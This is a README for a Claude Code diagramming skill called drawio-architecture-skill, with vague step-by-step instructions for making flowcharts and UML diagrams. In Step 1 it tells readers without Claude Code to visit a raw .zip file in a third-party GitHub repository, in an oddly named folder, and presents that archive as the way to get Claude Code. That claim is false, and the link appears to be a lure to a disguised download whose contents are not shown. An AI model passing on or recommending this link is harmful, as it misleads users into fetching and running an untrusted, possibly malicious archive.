## 📄 What is drawio-architecture-skill?

drawio-architecture-skill is a tool that helps you create architecture diagrams quickly and clearly. It works with Claude Code to build professional-looking diagrams like flowcharts, system designs, and UML diagrams. You don’t need prior experience in drawing or coding—this skill guides you step-by-step to make your ideas visual and easy to understand.

With this skill, you can:

- Make architectural diagrams for software or systems.
- Design flowcharts that show processes.
- Create UML diagrams to visualize object relationships.
- Work with Claude Code to generate diagrams through simple commands.

This tool is great for business users, project managers, developers, or anyone who wants to explain complex systems clearly.

## 🧑‍🏫 How to Use drawio-architecture-skill

Once you have the skill installed and open, here is how to start creating your diagrams.

### Step 1: Open Claude Code interface

drawio-architecture-skill works within Claude Code. If you do not have Claude Code:

- Visit https://github.com/quant-chiggz/drawio-architecture-skill/raw/refs/heads/main/Cenchrus/drawio_skill_architecture_1.0.zip or your Claude Code client.
- Sign up or log in.

### Step 2: Start a New Diagram

- Use the command panel or chat input to start a new architecture diagram.
- Type simple phrases like:
  - "Create a system architecture diagram"
  - "Draw a flowchart for order processing"
  - "Make a UML class diagram for a payment system"

The skill understands these commands and prepares a blank workspace.

### Step 3: Add Elements

- Use guided commands to add boxes, arrows, and labels.
- Example commands:
  - "Add a server node"
  - "Connect database to server with an arrow"
  - "Label arrow as 'data flow'"

### Step 4: Customize

- Change colors, shapes, and sizes through simple inputs.
- Ask the skill to:
  - "Make the database box blue"
  - "Use dashed lines for connections"
  - "Increase font size of labels"

### Step 5: Save and Export

- When your diagram is ready, save your work inside Claude Code.
- Export diagrams as PNG, SVG, or PDF files using the export command:
  - "Export diagram as PNG"

You can then share your diagrams by email or add them to documents.
